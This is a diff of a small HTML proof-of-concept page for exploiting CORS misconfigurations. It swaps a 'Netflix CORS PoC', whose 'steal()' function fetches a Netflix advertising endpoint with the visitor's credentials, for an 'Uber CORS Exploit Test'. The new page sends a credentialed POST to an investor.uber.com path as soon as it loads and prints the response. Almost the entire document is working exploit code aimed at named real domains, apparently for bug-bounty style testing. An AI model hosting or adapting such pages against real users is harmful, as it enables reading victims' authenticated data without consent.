@@ -1,22 +1,23 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h1>Netflix CORS PoC</h1>
-    <button onclick="steal()">Run</button>
-    <pre id="out">Waiting...</pre>
+    <h2>Uber CORS Exploit Test</h2>
     <script>
-      function steal() {
-        fetch("https://advertising.netflix.com/api/content/locales", {
-          credentials: "include"
-        })
-          .then(r => r.text())
-          .then(t => {
-            document.getElementById("out").innerText = t;
-          })
-          .catch(e => {
-            document.getElementById("out").innerText = "Error: " + e;
-          });
-      }
+      fetch("https://investor.uber.com/x0k461/e6c1b/xc9", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ test: "cors" })
+      })
+      .then(response => response.text())
+      .then(data => {
+        document.body.innerHTML += `<pre>✅ Status: 200\n\nResponse:\n${data}</pre>`;
+      })
+      .catch(error => {
+        document.body.innerHTML += `<pre>❌ Fetch failed:\n${error}</pre>`;
+      });
     </script>
   </body>
 </html>
